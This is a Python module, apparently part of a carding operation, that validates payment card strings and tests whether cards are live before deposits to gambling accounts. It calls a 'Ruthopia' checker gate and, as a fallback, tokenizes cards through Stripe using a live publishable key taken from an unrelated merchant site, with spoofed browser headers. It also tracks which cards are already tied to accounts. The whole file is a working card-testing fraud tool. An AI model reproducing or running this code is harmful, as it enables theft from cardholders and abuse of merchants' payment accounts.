# card_checker.py
"""Módulo de validación de sintaxis, formato y pre-check de liveness de tarjetas.

Incluye validación LUHN, expiración, y comprobación de liveness HTTP directo vía Stripe/Wabox (estilo Ruthopia /Rw gate).
"""
import time
import logging
from pathlib import Path
from datetime import datetime
from typing import Any, Dict, List, Optional, Tuple
import requests

logger = logging.getLogger(__name__)

# Rutas del proyecto
DASHBOARD_DIR = Path(__file__).parent.resolve()

# Configuración del gate Wabox (extracción de Ruthopia Bóveda)
WABOX_STRIPE_PK = "pk_live_WQNz0qa1BmBu47grZwTpj8BR"


def check_luhn(card_number: str) -> bool:
    """Verifica si el número de tarjeta cumple el algoritmo de Luhn."""
    digits = [int(c) for c in card_number if c.isdigit()]
    if not digits or len(digits) < 13 or len(digits) > 19:
        return False
    checksum = 0
    reverse_digits = digits[::-1]
    for i, digit in enumerate(reverse_digits):
        if i % 2 == 1:
            doubled = digit * 2
            checksum += doubled - 9 if doubled > 9 else doubled
        else:
            checksum += digit
    return checksum % 10 == 0


def parse_and_validate_card_pipe(pipe_str: str) -> Tuple[bool, Optional[Dict[str, str]], str]:
    """Parsea un pipe de tarjeta (3 o 4 partes) y valida Luhn + fecha + CVV.

    Retorna: (is_valid, parsed_dict, reason)
    parsed_dict: {"card_number": ..., "card_expiry": "MMYY", "card_cvv": ..., "bin": ...}
    """
    parts = [p.strip() for p in str(pipe_str).split("|") if p.strip()]
    if len(parts) < 3 or len(parts) > 4:
        return False, None, "Formato de pipe inválido (se esperaba num|exp|cvv o num|mm|yyyy|cvv)"

    card_num = parts[0]
    if not check_luhn(card_num):
        return False, None, "Número de tarjeta inválido (Luhn check fallido)"

    if len(parts) == 3:
        exp = parts[1]
        cvv = parts[2]
        if len(exp) != 4 or not exp.isdigit():
            return False, None, "Fecha de vencimiento debe ser MMYY de 4 dígitos"
    else:  # 4 partes
        mm = parts[1].zfill(2)
        yy = parts[2][-2:]
        exp = f"{mm}{yy}"
        cvv = parts[3]
        if len(mm) != 2 or not mm.isdigit() or int(mm) < 1 or int(mm) > 12:
            return False, None, "Mes de vencimiento inválido"
        if len(yy) != 2 or not yy.isdigit():
            return False, None, "Año de vencimiento inválido"

    if not (3 <= len(cvv) <= 4) or not cvv.isdigit():
        return False, None, "CVV inválido"

    mm_int = int(exp[:2])
    yy_int = int(exp[2:]) + 2000
    now = datetime.now()
    if mm_int < 1 or mm_int > 12:
        return False, None, "Mes de vencimiento fuera de rango (1-12)"

    if yy_int < now.year or (yy_int == now.year and mm_int < now.month):
        return False, None, "La tarjeta está vencida"

    parsed = {
        "card_number": card_num,
        "card_expiry": exp,
        "card_cvv": cvv,
        "bin": card_num[:6],
        "pipe_3parts": f"{card_num}|{exp}|{cvv}",
        "pipe_4parts": f"{card_num}|{exp[:2]}|20{exp[2:]}|{cvv}",
    }
    return True, parsed, "OK"


# Caché en memoria para liveness checks de Utopía (TTL 30 min = 1800s)
_UTOPIA_LIVENESS_CACHE: Dict[str, Tuple[float, bool, str, Dict[str, Any]]] = {}
UTOPIA_CACHE_TTL_SEC = 1800  # 30 minutos (regla Robert: no volver a checar en Utopía si fue aprobada recientemente)


def perform_wabox_liveness_check(card_data: Dict[str, str]) -> Tuple[bool, str, Dict[str, Any]]:
    """Ejecuta la autenticación y verificación de liveness oficial importando directamente el WaboxGate de Ruthopia.

    Invocación directa a ruthopia.gates.wabox.WaboxGate (misma VPS, montaje /app/ruthopia).
    Soporta caché de 30 minutos: si la tarjeta ya se checó y aprobó en <30min, se reusa el historial.
    Retorna: (is_live, status_label, raw_details)
    """
    card_num = card_data.get("card_number", "")
    now_ts = time.time()

    # Reuso de caché (< 30 min) para tarjetas previamente aprobadas/checadas
    if card_num in _UTOPIA_LIVENESS_CACHE:
        cached_ts, c_is_live, c_label, c_raw = _UTOPIA_LIVENESS_CACHE[card_num]
        age_sec = now_ts - cached_ts
        if age_sec < UTOPIA_CACHE_TTL_SEC:
            logger.info(f"[LivenessCache] REUSANDO check previo para tarjeta {card_num[:6]}··· (hace {int(age_sec/60)}m)")
            c_label_cached = f"{c_label} <i>(Caché Utopía {int(age_sec/60)}m)</i>"
            return c_is_live, c_label_cached, c_raw

    import sys, os, asyncio

    # 1. Configurar entorno de Ruthopia
    os.environ.setdefault("DATABASE_PATH", "/tmp/ruthopia_temp.db")
    if str(DASHBOARD_DIR) not in sys.path:
        sys.path.insert(0, str(DASHBOARD_DIR))

    # Cargar variables de entorno de Ruthopia si existen
    ruth_env_path = Path("/app/ruthopia_env")
    if ruth_env_path.exists():
        with open(ruth_env_path) as f:
            for line in f:
                if line.strip() and not line.startswith("#") and "=" in line:
                    k, v = line.strip().split("=", 1)
                    k_str = k.strip()
                    v_str = v.strip()
                    if k_str == "DATABASE_PATH":
                        os.environ[k_str] = "/data/ruthopia.db"
                    else:
                        os.environ[k_str] = v_str
    os.environ["DATABASE_PATH"] = "/data/ruthopia.db"

    pipe_str = card_data.get("pipe_4parts", f"{card_data['card_number']}|{card_data['card_expiry'][:2]}|20{card_data['card_expiry'][2:]}|{card_data['card_cvv']}")

    try:
        from ruthopia.gates.wabox import WaboxGate
        from ruthopia.core.models import CheckStatus

        gate = WaboxGate()

        # Ejecutar de forma asíncrona dentro de la función síncrona
        try:
            loop = asyncio.get_event_loop()
        except RuntimeError:
            loop = asyncio.new_event_loop()
            asyncio.set_event_loop(loop)

        if loop.is_running():
            import nest_asyncio
            nest_asyncio.apply()
            res = loop.run_until_complete(gate.check(pipe_str))
        else:
            res = loop.run_until_complete(gate.check(pipe_str))

        bin_info = res.bin_info or {}
        brand = bin_info.get("type", "Card").capitalize()
        level = bin_info.get("level", "").upper()
        country = bin_info.get("country_flag", "")
        bank = bin_info.get("bank", "")[:20]

        if res.status == CheckStatus.APPROVED:
            label = f"🟢 LIVE (Auth OK) - <i>{brand} {level} {bank} [{country}]</i>"
            raw_res = {"status": "APPROVED", "message": res.message, "raw": str(res)}
            _UTOPIA_LIVENESS_CACHE[card_num] = (now_ts, True, label, raw_res)
            return True, label, raw_res
        else:
            msg = res.message or "Card Declined"
            label = f"🔴 DECLINED (Auth Failed) - <i>{msg[:50]}</i>"
            raw_res = {"status": "DECLINED", "message": res.message, "raw": str(res)}
            # No guardamos declinadas en caché largo para dar oportunidad de reintento si fue blip
            return False, label, raw_res

    except Exception as e:
        logger.warning(f"Error invocando Ruthopia WaboxGate directo: {e}, aplicando fallback tokenizado")
        # Fallback a tokenización Stripe si ocurre un error inesperado
        card_num = card_data["card_number"]
        exp_month = card_data["card_expiry"][:2]
        exp_year = "20" + card_data["card_expiry"][2:]
        cvv = card_data["card_cvv"]

        data = {
            "card[number]": card_num,
            "card[exp_month]": exp_month,
            "card[exp_year]": exp_year,
            "card[cvc]": cvv,
            "key": WABOX_STRIPE_PK,
            "payment_user_agent": "stripe.js/3b1bde7a92; stripe-js-v3/3b1bde7a92; card-element",
            "pasted_fields": "number",
            "referrer": "https://www.waboxapp.com",
        }
        headers = {
            "Authorization": f"Bearer {WABOX_STRIPE_PK}",
            "Content-Type": "application/x-www-form-urlencoded",
            "Origin": "https://js.stripe.com",
            "Referer": "https://js.stripe.com/",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Accept": "application/json",
        }
        try:
            res = requests.post("https://api.stripe.com/v1/tokens", data=data, headers=headers, timeout=6)
            res_json = res.json()
            if res.status_code == 200 and "id" in res_json:
                card_info = res_json.get("card", {})
                brand = card_info.get("brand", "Card")
                funding = card_info.get("funding", "")
                country = card_info.get("country", "")
                label = f"🟢 LIVE (Tokenized) - <i>{brand} {funding} [{country}]</i>"
                _UTOPIA_LIVENESS_CACHE[card_num] = (now_ts, True, label, res_json)
                return True, label, res_json
            else:
                err = res_json.get("error", {})
                msg = err.get("message", "Card declined")
                code = err.get("code", "declined")
                label = f"🔴 DECLINED - <i>{msg} ({code})</i>"
                return False, label, res_json
        except Exception as ex:
            label = f"🟡 UNCHECKED (Timeout) - <i>{str(ex)[:40]}</i>"
            return True, label, {"error": str(ex)}


def precheck_card_liveness(card_pipe: str) -> Tuple[bool, str, Optional[Dict[str, str]]]:
    """Realiza la verificación completa de liveness pre-depósito.

    Aplica sintaxis, Luhn, fecha, check de tarjetas asociadas y comprobación HTTP
    liveness con Ruthopia Gate.
    """
    valid, parsed, reason = parse_and_validate_card_pipe(card_pipe)
    if not valid:
        return False, f"🔴 INVALID - <i>{reason}</i>", None

    # Check temprano: ¿La tarjeta ya está asociada a alguna cuenta? O ¿la cuenta está RATE_LIMITED?
    from app import db
    card_num = parsed.get("card_number")
    with db(write=False) as c:
        # 1. Check de tarjetas asociadas
        existing = c.execute(
            "SELECT account_email FROM account_cards WHERE card_num=?",
            (card_num,)
        ).fetchone()
        if existing:
            email = existing["account_email"]
            # Registrar en logs del dashboard (no en Telegram) y emitir alerta SSE al dashboard
            import logging
            logger = logging.getLogger("betmexico.dashboard.card_checker")
            logger.warning(f"[CARD_MARRIED] Tarjeta {card_num[:6]}··· ya asociada a cuenta {email}")
            try:
                from app import _broadcast
                _broadcast({
                    "type": "activity",
                    "kind": "alert",
                    "level": "warning",
                    "title": "CARD_MARRIED",
                    "message": f"⚠️ Tarjeta {card_num[:6]}··· ya está asociada a la cuenta {email}. No se puede asociar a otra cuenta.",
                    "target": email,
                    "card_num": card_num
                })
            except Exception as _b_err:
                logger.debug(f"No se pudo emitir broadcast para CARD_MARRIED: {_b_err}")

            return False, f"🔴 MARRIED - <i>Tarjeta ya asociada a {email}</i>", parsed

        # 2. Check de RATE_LIMITED (excluir cuentas bloqueadas permanentemente)
        # Nota: `email` debe pasarse como argumento a `precheck_card_liveness` desde el caller
        if 'email' in parsed:
            account_status = c.execute(
                "SELECT status, dead_reason FROM accounts WHERE email=?",
                (parsed['email'],)
            ).fetchone()
            if account_status and "RATE_LIMITED" in (account_status["dead_reason"] or ""):
                return False, "🔴 RATE_LIMITED - Cuenta bloqueada permanentemente", None

    is_live, status_label, raw = perform_wabox_liveness_check(parsed)
    parsed["liveness_label"] = status_label
    parsed["is_live"] = is_live

    if not is_live:
        return False, status_label, parsed

    return True, status_label, parsed


def format_ruthopia_liveness_summary(results: List[Dict[str, Any]]) -> str:
    """Genera la visualización del resultado de liveness con estética del bot Ruthopia.

    Estilo Ruthopia Bot: Emojis, HTML format, tarjeta enmascarada y badges.
    """
    lines = ["<b>ʀ.ᴜᴛʜᴏᴘɪᴀ ɢᴀᴛᴇ /ʀᴡ — Liveness Check Result</b>", "----------------------------------------"]
    for item in results:
        pipe = item.get("pipe", "")
        status = item.get("status_label", "UNCHECKED")
        lines.append(f"💳 <code>{pipe}</code> {status}")
    lines.append("----------------------------------------")
    accepted = [i for i in results if i.get("ok")]
    discarded = [i for i in results if not i.get("ok")]
    lines.append(f"✅ Aceptadas: <b>{len(accepted)}</b> | ❌ Descartadas: <b>{len(discarded)}</b>")
    return "\n".join(lines)
